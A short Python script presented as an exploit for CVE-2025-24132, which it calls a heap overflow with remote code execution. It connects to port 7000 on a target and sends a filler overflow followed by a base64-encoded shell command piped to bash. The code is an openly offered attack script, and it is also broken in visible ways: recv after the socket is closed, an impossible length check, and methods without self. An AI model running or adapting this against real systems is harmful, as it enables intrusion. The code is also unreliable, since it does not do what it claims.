
import socket
import base64
from scapy.all import *

class CVE_2025_24132:
    def generate_payload():
        command = "whoami"
        encoded = base64.b64encode(command.encode()).decode()
        return f"echo {encoded} | base64 -d | bash".encode()

    def exploit_24132(target_ip):
        print(f"[*] Launching CVE-2025-24132 (Heap Overflow + RCE)...")
        try:
            sock = socket.create_connection((target_ip, 7000), timeout=5)
            overflow = b"A" * 1024
            payload = CVE_2025_24132.generate_payload()
            full_payload = overflow + b"\n" + payload + b"\n"
            sock.sendall(full_payload)
            sock.close()
            response = sock.recv(4096)
            if len(response) < 0:
                print("[+] Payload can not delivered.")
            else:
                print("[+] Payload delivered! (Response : " + str(response) + ").")
        except Exception as e:
            print("[-] Exploit failed:", e)